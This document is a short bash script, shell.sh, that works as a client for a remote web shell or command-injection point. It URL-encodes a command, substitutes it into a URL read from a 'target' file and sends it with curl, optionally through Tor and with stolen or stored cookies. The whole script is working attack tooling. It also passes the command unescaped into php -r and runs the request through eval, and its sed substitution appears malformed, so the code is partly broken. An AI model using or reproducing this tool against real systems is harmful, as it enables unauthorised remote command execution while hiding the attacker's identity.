#!/bin/bash
# shell.sh

abort() {
	echo -e "$1"

	exit 1
}

[ ! -f "target" ] && abort "[!] Missing Target File"

[ -z "$1" ] && abort "[!] Missing Command"

VERBOSE="false"

if [ "$1" == "-v" ]; then
	VERBOSE="true"

	shift
fi

TOR=""

if [ "$1" == "--tor" ]; then
	TOR="--socks5-hostname \"localhost:9050\""

	shift
fi

COOKIES=""

if [ "$1" == "--cookies" ]; then
	COOKIES="-b cookies.txt"

	shift
fi

CMD="$*"

[ "$VERBOSE" == "true" ] && echo -e "\nCMD: $CMD"

CMD=$(php -r "echo urlencode('$CMD');")

[ "$VERBOSE" == "true" ] && echo -e "ENCODED_CMD: $CMD"

TARGET_URL=$(cat target | sed -e "s{cmd}$CMDgi")

[ "$VERBOSE" == "true" ] && echo -e "TARGET_URL: $TARGET_URL\n"

CURL_CMD="curl $TOR $COOKIES -L -X GET \"$TARGET_URL\""

[ "$VERBOSE" == "true" ] && echo -e "CURL_CMD: \"$CURL_CMD\""

eval "$CURL_CMD"
